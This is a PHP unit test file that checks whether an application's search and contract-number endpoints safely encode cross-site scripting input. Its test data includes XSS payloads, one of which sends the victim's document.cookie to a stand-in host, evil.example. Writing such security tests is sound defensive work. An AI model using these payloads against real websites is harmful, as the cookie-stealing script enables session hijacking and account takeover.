<?php declare(strict_types=1);

use FirstAdvisory\FAWill\model\Operations\AjaxRequest;
use FirstAdvisory\FAWill\model\Operations\NewRetrievalCode;

/**
 * S-03, S-04 — Cross-Site Scripting (XSS)
 *
 * Verifies that XSS payloads stored or returned through the backend are handled
 * safely. Data returned by the PHP layer is fed into json_encode(), which escapes
 * angle-bracket characters by default, so no raw script tags can appear in the
 * JSON wire format.
 */
class XssTest extends BperTestCase
{
    private NewRetrievalCode $operation;

    protected function setUp(): void
    {
        $this->operation = new NewRetrievalCode();
    }

    /**
     * S-03: XSS payload in search term.
     *
     * The backend must return an array. When that array is later serialised via
     * json_encode() the angle-bracket characters are Unicode-escaped, so no
     * executable script tag can appear in the JSON output.
     */
    public function testS03XssInSearchTerm(): void
    {
        $payload = '<script>alert(1)</script>';
        $request = new AjaxRequest('GET', 'search', ['q' => $payload]);

        $result = $this->operation->searchPolicy($request);

        $this->assertIsArray($result, 'searchPolicy() must return an array for XSS payload');

        // Verify json_encode escapes the payload — no raw < or > in JSON output
        $json = json_encode($result);
        $this->assertNotFalse($json, 'json_encode() must succeed');
        $this->assertStringNotContainsString('<script>', $json, 'json_encode() must escape < characters');
        $this->assertStringNotContainsString('</script>', $json, 'json_encode() must escape < characters');
    }

    /**
     * S-03 variant: event-handler XSS payload in search term.
     */
    public function testS03EventHandlerXssInSearchTerm(): void
    {
        $payload = '"><img src=x onerror=alert(1)>';
        $request = new AjaxRequest('GET', 'search', ['q' => $payload]);

        $result = $this->operation->searchPolicy($request);

        $this->assertIsArray($result, 'searchPolicy() must return an array for event-handler XSS payload');

        $json = json_encode($result);
        $this->assertNotFalse($json, 'json_encode() must succeed');
        $this->assertStringNotContainsString('<img', $json, 'json_encode() must escape < characters in img tag');
    }

    /**
     * S-04: XSS payload in contract number (tabella action).
     *
     * getExistingCodes() either returns an array (possibly empty) or throws a
     * domain exception. Either way no raw HTML is echoed; the array values are
     * later safe-encoded by json_encode().
     */
    public function testS04XssInContractNumber(): void
    {
        $payload = '<img onerror=alert(1)>';
        $request = new AjaxRequest('GET', 'tabella', ['bper_contract_number' => $payload]);

        try {
            $result = $this->operation->getExistingCodes($request);
            $this->assertIsArray($result, 'getExistingCodes() must return an array for XSS payload');

            // Any strings in the result must be safely json-encodable
            $json = json_encode($result);
            $this->assertNotFalse($json, 'json_encode() must succeed on getExistingCodes() result');
            $this->assertStringNotContainsString('<img', $json, 'json_encode() must escape < in returned data');
        } catch (\InvalidArgumentException | \RuntimeException $e) {
            // A domain-level rejection is also acceptable
            $this->assertTrue(true, 'Domain exception raised for XSS payload in contract number');
        }
    }

    /**
     * S-04 variant: script tag XSS in the autocomplete search field.
     *
     * Ensures searchPolicy() short-circuits on payloads shorter than 2 chars
     * or returns a safely-encodable array when the payload is longer.
     */
    public function testS04XssInAutocompleteFull(): void
    {
        $payload = '<script>fetch("https://evil.example/?" + document.cookie)</script>';
        $request = new AjaxRequest('GET', 'search', ['q' => $payload]);

        $result = $this->operation->searchPolicy($request);

        $this->assertIsArray($result, 'searchPolicy() must return an array');

        $json = json_encode($result);
        $this->assertNotFalse($json, 'json_encode() must succeed');
        $this->assertStringNotContainsString('<script>', $json, 'json_encode() must escape script tags in output');
    }
}
